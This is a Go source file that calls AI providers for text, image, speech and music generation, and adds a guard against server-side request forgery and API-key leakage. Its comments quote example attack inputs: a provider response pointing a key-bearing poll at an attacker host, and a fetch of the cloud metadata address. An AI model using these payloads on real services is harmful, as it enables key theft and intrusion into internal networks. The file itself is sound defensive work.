package ai

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// provider.go performs the outbound calls to the configured AI provider. It is
// PROVIDER-AGNOSTIC: OpenAI-compatible and Anthropic-compatible request/response
// shapes are both supported, selected by the base URL (an "anthropic" host uses
// the Anthropic shape, everything else the OpenAI shape). The server-side key is
// attached to the request here and NEVER logged.

// providerError is a clean, key-free error for any provider failure. Handlers
// map it to a 502 envelope; the raw provider body/status is summarized without
// echoing request headers.
type providerError struct{ msg string }

func (e *providerError) Error() string { return e.msg }

func provErr(format string, args ...any) error {
	return &providerError{msg: fmt.Sprintf(format, args...)}
}

func isAnthropic(baseURL string) bool {
	return strings.Contains(strings.ToLower(baseURL), "anthropic")
}

// musicKind is the outbound MUSIC provider dialect, selected off the music base
// URL exactly the way isAnthropic selects the text/audio shape. The default is
// the synchronous OpenAI-compatible /audio/music POST; the real generative-music
// services (Suno, Replicate) are ASYNC — a create call returns a job id and the
// finished audio is fetched by polling — so they get their own dialect here.
type musicKind int

const (
	// musicKindSync is the synchronous OpenAI-compatible shape: one POST returns
	// the encoded track in the response body.
	musicKindSync musicKind = iota
	// musicKindReplicate is the Replicate predictions shape: POST /predictions
	// returns {id,status,urls.get}; poll urls.get until status=="succeeded" and
	// fetch the `output` audio URL.
	musicKindReplicate
	// musicKindSuno is the Suno-style shape: POST /generate returns a job id;
	// poll /feed/{id} until a clip reports status=="complete" with an audio_url.
	musicKindSuno
)

// musicProviderKind classifies the configured music base URL. Keyed off the URL
// like isAnthropic so a handler/GenerateMusic never has to know which service is
// behind the seam. Any host that is not obviously Suno/Replicate is treated as
// the synchronous OpenAI-compatible shape (what musicBaseUrl/musicModel document).
func musicProviderKind(baseURL string) musicKind {
	u := strings.ToLower(baseURL)
	switch {
	case strings.Contains(u, "replicate"):
		return musicKindReplicate
	case strings.Contains(u, "suno"):
		return musicKindSuno
	default:
		return musicKindSync
	}
}

// joinURL joins a base URL and a path, tolerating a trailing slash on the base
// and a base that already includes the path suffix.
func joinURL(base, suffix string) string {
	base = strings.TrimRight(strings.TrimSpace(base), "/")
	if strings.HasSuffix(base, suffix) {
		return base
	}
	return base + suffix
}

// authHeaders sets the provider auth header(s) for the request against a
// specific endpoint. `anthropic` selects the Anthropic scheme (x-api-key) vs
// the OpenAI-compatible Bearer scheme. The key is written straight onto the
// header and never logged.
func authHeaders(req *http.Request, cfg Config, anthropic bool) {
	req.Header.Set("Content-Type", "application/json")
	if anthropic {
		req.Header.Set("x-api-key", cfg.APIKey)
		req.Header.Set("anthropic-version", "2023-06-01")
		return
	}
	req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
}

// ---- the SSRF guard (F-08 / GH#86) -----------------------------------------
//
// EVERY URL IN THIS FILE COMES FROM ONE OF TWO PLACES, and they are not equally
// trustworthy:
//
//   - DERIVED from the admin-configured base URL (joinURL(cfg.MusicBaseURL, …)).
//     An operator with the admin role typed that; validURL already bounded it.
//   - HANDED BACK BY THE PROVIDER, inside its JSON: Replicate's `urls.get`,
//     `output`, Suno's `audio_url`, OpenAI's image `url`. These are ATTACKER
//     DATA the moment the provider is malicious, compromised, or merely hosting
//     an open redirect — and we followed them with no checks at all.
//
// Two distinct things went wrong with the second kind:
//
//  1. KEY EXFILTRATION. getRaw attaches `Authorization: Bearer <key>` /
//     `x-api-key` unconditionally, and the music poll loop points it at
//     `urls.get` straight out of the create response. `{"urls":{"get":
//     "http://attacker/"}}` and the server-side provider key is delivered to
//     the attacker, once per poll.
//  2. SSRF. The keyless asset fetches (audio/image) would happily GET
//     `http://169.254.169.254/latest/meta-data/` or any service on this box,
//     turning the platform into a jump host into its own network.
//
// guardProviderURL is the ONE place both are refused, and all three followers
// (getRaw / fetchAudioBytes / fetchImageBytes) must go through it.
//
// THE POLICY IS RELATIVE TO THE CONFIGURED PROVIDER, not an absolute blocklist,
// because an absolute one is wrong in both directions:
//
//   - a real delivery host is a DIFFERENT host from the API host (Replicate
//     delivers from a CDN, OpenAI from blob storage), so "same host only" would
//     break every working install; and
//   - a self-hosted provider on the LAN — the reason validURL still allows
//     http:// — is legitimately on a private address, so "never touch private
//     space" would break that one.
//
// So: the key may only go to the configured provider's own domain, and a fetch
// may not reach a network zone the configured provider is not already in.
//
// ⚠️ KNOWN RESIDUAL, written down rather than papered over (第三守則): the zone
// check resolves the name here, and the http client resolves it again when it
// dials, so a hostile DNS server that answers differently the second time (DNS
// rebinding) is not covered. Closing that needs a dial-time hook on the
// transport; the key-exfiltration half above is NAME-based and is not affected.

// allowPrivateFetchEnv is the one-switch rollback (第〇·六守則: 不能停的時候做成
// 開關). Set it to 1 and provider-returned URLs may reach private space again —
// the deployment that needs it is a self-hosted provider whose delivery host is
// a *different* private host from its API host.
const allowPrivateFetchEnv = "GGD_AI_ALLOW_PRIVATE_FETCH"

func allowPrivateFetch() bool {
	v := strings.TrimSpace(strings.ToLower(os.Getenv(allowPrivateFetchEnv)))
	return v == "1" || v == "true"
}

// registrableish is a deliberately crude eTLD+1: the last two labels of a name.
// It is used ONLY to decide whether a poll URL is still "the provider we
// configured" (api.replicate.com ↔ replicate.com), never to grant anything, and
// a crude answer here is conservative in the safe direction — it accepts fewer
// hosts than a real public-suffix list would, not more. (golang.org/x/net's
// publicsuffix would be exact, but it is an INDIRECT dependency of this module
// and promoting it for one string comparison is not worth the go.mod churn.)
func registrableish(host string) string {
	labels := strings.Split(strings.Trim(strings.ToLower(host), "."), ".")
	if len(labels) < 2 {
		return strings.ToLower(host)
	}
	return strings.Join(labels[len(labels)-2:], ".")
}

// sameProviderDomain reports that `target` is the configured provider host or a
// sibling under the same registrable domain. IP literals must match exactly:
// two addresses under "the same domain" is not a meaningful idea.
func sameProviderDomain(target, base string) bool {
	if strings.EqualFold(target, base) {
		return true
	}
	if net.ParseIP(target) != nil || net.ParseIP(base) != nil {
		return false
	}
	t := registrableish(target)
	return t != "" && t == registrableish(base)
}

// privateAddr reports an address that is not routable on the public internet:
// loopback, RFC1918/ULA, link-local (169.254.169.254 — the cloud metadata
// endpoint — lands here), the unspecified address, and multicast.
func privateAddr(ip net.IP) bool {
	return ip.IsLoopback() || ip.IsPrivate() || ip.IsUnspecified() ||
		ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
		ip.IsInterfaceLocalMulticast() || ip.IsMulticast()
}

// hostIsPrivate reports whether `host` names private space. A name that cannot
// be resolved reports false: an unresolvable host cannot be FETCHED either, so
// failing closed here would only turn transient DNS trouble into a hard outage
// while blocking nothing a dial would not block anyway.
func hostIsPrivate(ctx context.Context, host string) bool {
	if ip := net.ParseIP(host); ip != nil {
		return privateAddr(ip)
	}
	addrs, err := net.DefaultResolver.LookupIPAddr(ctx, host)
	if err != nil {
		return false
	}
	// ANY private answer is enough: the dialer may pick that one.
	for _, a := range addrs {
		if privateAddr(a.IP) {
			return true
		}
	}
	return false
}

// guardProviderURL decides whether `raw` — a URL the PROVIDER chose — may be
// fetched, given the admin-configured `base` for that capability. carriesKey is
// true when the server-side API key rides along on the request.
//
// Errors are provider-shaped (a clean 502 upstream) and name only the host, so
// nothing here can echo a token into a log line.
func guardProviderURL(ctx context.Context, raw, base string, carriesKey bool) error {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || !u.IsAbs() || u.Hostname() == "" {
		return provErr("provider returned an unusable URL")
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return provErr("provider returned a %q URL; only http(s) is followed", u.Scheme)
	}
	b, err := url.Parse(strings.TrimSpace(base))
	if err != nil || b.Hostname() == "" {
		return provErr("no configured provider host to check the URL against")
	}
	// No silent downgrade: a provider configured over TLS may not send us to a
	// cleartext host, where the bytes (and, for a poll, the key) are readable.
	if b.Scheme == "https" && u.Scheme != "https" {
		return provErr("refusing to follow a cleartext URL from an https provider")
	}
	if carriesKey && !sameProviderDomain(u.Hostname(), b.Hostname()) {
		return provErr("refusing to send the provider key to %s", u.Hostname())
	}
	if allowPrivateFetch() {
		return nil
	}
	// A provider that is itself on the private side (a self-hosted/LAN endpoint,
	// or a test server) is allowed to hand back private URLs: that zone is where
	// it lives. A PUBLIC provider pointing us inward is the attack.
	if hostIsPrivate(ctx, b.Hostname()) {
		return nil
	}
	if hostIsPrivate(ctx, u.Hostname()) {
		return provErr("refusing to fetch %s: it resolves inside this network", u.Hostname())
	}
	return nil
}

// doJSON posts body to url with the provider auth headers and decodes the JSON
// response into out. A non-2xx is a clean providerError (no header echo).
func (s *Service) doJSON(ctx context.Context, url string, cfg Config, anthropic bool, body any, out any) error {
	buf, err := json.Marshal(body)
	if err != nil {
		return provErr("encode request: %v", err)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(buf))
	if err != nil {
		return provErr("build request: %v", err)
	}
	authHeaders(req, cfg, anthropic)
	resp, err := s.http.Do(req)
	if err != nil {
		return provErr("provider unreachable")
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 8<<20)) // cap 8MiB
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return provErr("provider returned %d", resp.StatusCode)
	}
	if err := json.Unmarshal(respBody, out); err != nil {
		return provErr("decode provider response: %v", err)
	}
	return nil
}

// doBinary posts body to url with the provider auth headers and returns the raw
// response bytes (audio, etc.). A non-2xx or empty body is a clean providerError.
func (s *Service) doBinary(ctx context.Context, url string, cfg Config, anthropic bool, body any) ([]byte, error) {
	return s.doBinaryClient(ctx, s.http, url, cfg, anthropic, body)
}

// doBinaryClient is doBinary with an EXPLICIT client, so the music path can use
// its own longer-deadline client (see musicClient) while the shared 60s s.http
// stays the injection point every other call — and the tests — use.
func (s *Service) doBinaryClient(ctx context.Context, client *http.Client, url string, cfg Config, anthropic bool, body any) ([]byte, error) {
	buf, err := json.Marshal(body)
	if err != nil {
		return nil, provErr("encode request: %v", err)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(buf))
	if err != nil {
		return nil, provErr("build request: %v", err)
	}
	authHeaders(req, cfg, anthropic)
	resp, err := client.Do(req)
	if err != nil {
		return nil, provErr("provider unreachable")
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 16<<20)) // cap 16MiB
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, provErr("provider returned %d", resp.StatusCode)
	}
	if len(respBody) == 0 {
		return nil, provErr("provider returned empty body")
	}
	return respBody, nil
}

// postRaw POSTs body with the provider auth headers and returns the raw response
// bytes (JSON, typically a job-create envelope). Used by the async music
// adapters where the response is parsed provider-specifically by the caller.
func (s *Service) postRaw(ctx context.Context, client *http.Client, url string, cfg Config, anthropic bool, body any) ([]byte, error) {
	buf, err := json.Marshal(body)
	if err != nil {
		return nil, provErr("encode request: %v", err)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(buf))
	if err != nil {
		return nil, provErr("build request: %v", err)
	}
	authHeaders(req, cfg, anthropic)
	resp, err := client.Do(req)
	if err != nil {
		return nil, provErr("provider unreachable")
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // cap 1MiB (job envelope)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, provErr("provider returned %d", resp.StatusCode)
	}
	return respBody, nil
}

// getRaw GETs url WITH the provider auth headers and returns the raw response
// bytes. Async music providers require the key on the poll endpoint (it is the
// same API host as create); the key is attached here and never logged.
//
// `base` is the admin-configured base URL this poll belongs to. It is a
// REQUIRED argument, not an option: `url` here comes out of the provider's own
// JSON, and without the guard this function is a one-request key exfiltrator
// (GH#86). carriesKey is true, so the URL must stay on the provider's domain.
func (s *Service) getRaw(ctx context.Context, client *http.Client, url, base string, cfg Config, anthropic bool) ([]byte, error) {
	if err := guardProviderURL(ctx, url, base, true); err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, provErr("build request: %v", err)
	}
	authHeaders(req, cfg, anthropic)
	resp, err := client.Do(req)
	if err != nil {
		return nil, provErr("provider unreachable")
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // cap 1MiB (job status)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, provErr("provider returned %d", resp.StatusCode)
	}
	return respBody, nil
}

// fetchAudioBytes GETs the finished track a provider returned by reference. Like
// fetchImageBytes it attaches NO auth header: this is a pre-signed delivery URL
// from the provider's own JSON, not an API call, and the key must never leave
// the provider host. `base` is the configured music base URL — the delivery host
// is allowed to differ from it, but not to point back inside our network (GH#86).
func (s *Service) fetchAudioBytes(ctx context.Context, client *http.Client, url, base string) ([]byte, error) {
	if err := guardProviderURL(ctx, url, base, false); err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, provErr("build audio fetch: %v", err)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, provErr("audio host unreachable")
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, provErr("audio host returned %d", resp.StatusCode)
	}
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 32<<20)) // cap 32MiB (a full track)
	if err != nil || len(raw) == 0 {
		return nil, provErr("audio host returned no bytes")
	}
	return raw, nil
}

// ---- image generation -------------------------------------------------------

// openAIImageResp matches the OpenAI images API response. BOTH payload shapes
// are declared because both are real: the legacy DALL·E models answer with a
// hosted `url` unless asked otherwise, the current models always answer with
// `b64_json`.
type openAIImageResp struct {
	Data []struct {
		B64JSON string `json:"b64_json"`
		URL     string `json:"url"`
	} `json:"data"`
}

// legacySize is the set of square edges the DALL·E models accept.
var legacySize = map[int]bool{256: true, 512: true, 1024: true}

// isLegacyImageModel reports the DALL·E request dialect.
//
// THIS DISTINCTION IS NOT COSMETIC — it is the difference between working and
// a hard 400 on every single call. The two dialects disagree on two fields:
//
//   - `response_format`: dall-e-2/3 accept it and default to a hosted URL.
//     The CURRENT models REJECT the parameter outright and always return
//     base64. Sending it is an unconditional 400.
//   - `size`: dall-e-2 takes 256/512/1024 squares. The current models take
//     only 1024x1024, 1024x1536, 1536x1024 or "auto", so the 16..1024 clamp
//     in generate.go (default 256) produces a size they refuse.
//
// Anything not obviously DALL·E is treated as the current dialect, because
// that is what a fresh operator will configure. A third-party OpenAI-compatible
// endpoint that still wants a URL response is covered too: it simply answers
// with `url` instead of `b64_json`, and the fetch below picks that up.
func isLegacyImageModel(model string) bool {
	return strings.HasPrefix(strings.ToLower(strings.TrimSpace(model)), "dall-e")
}

// imageRequestSize is the `size` string to send for (model, requested edge).
//
// The current models have no small square, so a caller asking for a 64px icon
// gets a 1024px image and is expected to downscale — which is strictly better
// than the 400 it used to get, and is what tools/icon-gen does. The requested
// edge is honoured exactly on the legacy models, snapped UP to the next
// supported edge so a request never comes back smaller than it asked for.
func imageRequestSize(model string, size int) string {
	if !isLegacyImageModel(model) {
		return "1024x1024"
	}
	for _, edge := range []int{256, 512, 1024} {
		if size <= edge {
			return fmt.Sprintf("%dx%d", edge, edge)
		}
	}
	return "1024x1024"
}

// fetchImageBytes GETs an image the provider returned by reference. No auth
// header is attached: this is a pre-signed URL from the provider's own JSON
// response, not an API call, and the key must never leave the provider host.
// `base` is the configured image base URL; see guardProviderURL (GH#86).
func (s *Service) fetchImageBytes(ctx context.Context, url, base string) ([]byte, error) {
	if err := guardProviderURL(ctx, url, base, false); err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, provErr("build image fetch: %v", err)
	}
	resp, err := s.http.Do(req)
	if err != nil {
		return nil, provErr("image host unreachable")
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, provErr("image host returned %d", resp.StatusCode)
	}
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 16<<20)) // cap 16MiB
	if err != nil || len(raw) == 0 {
		return nil, provErr("image host returned no bytes")
	}
	return raw, nil
}

// generateImagePNG calls the configured image provider and returns raw image
// bytes. Only OpenAI-compatible image endpoints are called (the dominant image
// API shape), in whichever of the two dialects the configured model speaks.
func (s *Service) generateImagePNG(ctx context.Context, cfg Config, prompt string, size int) ([]byte, error) {
	url := joinURL(cfg.ImageBaseURL, "/images/generations")
	body := map[string]any{
		"model":  cfg.ImageModel,
		"prompt": prompt,
		"n":      1,
		"size":   imageRequestSize(cfg.ImageModel, size),
	}
	if isLegacyImageModel(cfg.ImageModel) {
		// Only the legacy models accept this, and they need it: without it they
		// answer with a hosted URL that expires.
		body["response_format"] = "b64_json"
	}
	var out openAIImageResp
	if err := s.doJSON(ctx, url, cfg, isAnthropic(cfg.ImageBaseURL), body, &out); err != nil {
		return nil, err
	}
	if len(out.Data) == 0 {
		return nil, provErr("provider returned no image data")
	}
	if b64 := out.Data[0].B64JSON; b64 != "" {
		raw, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			return nil, provErr("provider returned malformed base64 image")
		}
		return raw, nil
	}
	if href := out.Data[0].URL; href != "" {
		return s.fetchImageBytes(ctx, href, cfg.ImageBaseURL)
	}
	return nil, provErr("provider returned no image data")
}

// ---- speech generation ------------------------------------------------------

// generateTTSMP3 calls the configured TTS provider and returns raw MP3 bytes.
// Only the OpenAI-compatible /audio/speech shape is called (the dominant TTS
// API shape; the response is the raw audio stream). The optional lang hint is
// forwarded for providers that accept it; OpenAI-compatible endpoints ignore
// unknown fields.
func (s *Service) generateTTSMP3(ctx context.Context, cfg Config, text, lang, voice string) ([]byte, error) {
	url := joinURL(cfg.TTSBaseURL, "/audio/speech")
	v := strings.TrimSpace(voice)
	if v == "" {
		v = strings.TrimSpace(cfg.TTSVoice)
	}
	if v == "" {
		v = "alloy"
	}
	body := map[string]any{
		"model":           cfg.TTSModel,
		"input":           text,
		"voice":           v,
		"response_format": "mp3",
	}
	if l := strings.TrimSpace(lang); l != "" {
		body["language"] = l
	}
	return s.doBinary(ctx, url, cfg, isAnthropic(cfg.TTSBaseURL), body)
}

// ---- text generation --------------------------------------------------------

type openAIChatResp struct {
	Choices []struct {
		Message struct {
			Content string `json:"content"`
		} `json:"message"`
	} `json:"choices"`
}

type anthropicResp struct {
	Content []struct {
		Type string `json:"type"`
		Text string `json:"text"`
	} `json:"content"`
}

// generateText calls the configured text provider and returns the generated
// string. Both the OpenAI chat-completions and Anthropic messages shapes are
// supported (selected by the text base URL).
func (s *Service) generateText(ctx context.Context, cfg Config, system, user string) (string, error) {
	if isAnthropic(cfg.TextBaseURL) {
		url := joinURL(cfg.TextBaseURL, "/messages")
		body := map[string]any{
			"model":      cfg.TextModel,
			"max_tokens": 512,
			"system":     system,
			"messages": []map[string]any{
				{"role": "user", "content": user},
			},
		}
		var out anthropicResp
		if err := s.doJSON(ctx, url, cfg, true, body, &out); err != nil {
			return "", err
		}
		for _, c := range out.Content {
			if c.Type == "text" && c.Text != "" {
				return strings.TrimSpace(c.Text), nil
			}
		}
		return "", provErr("provider returned no text")
	}

	url := joinURL(cfg.TextBaseURL, "/chat/completions")
	body := map[string]any{
		"model": cfg.TextModel,
		"messages": []map[string]any{
			{"role": "system", "content": system},
			{"role": "user", "content": user},
		},
	}
	var out openAIChatResp
	if err := s.doJSON(ctx, url, cfg, false, body, &out); err != nil {
		return "", err
	}
	if len(out.Choices) == 0 || strings.TrimSpace(out.Choices[0].Message.Content) == "" {
		return "", provErr("provider returned no text")
	}
	return strings.TrimSpace(out.Choices[0].Message.Content), nil
}
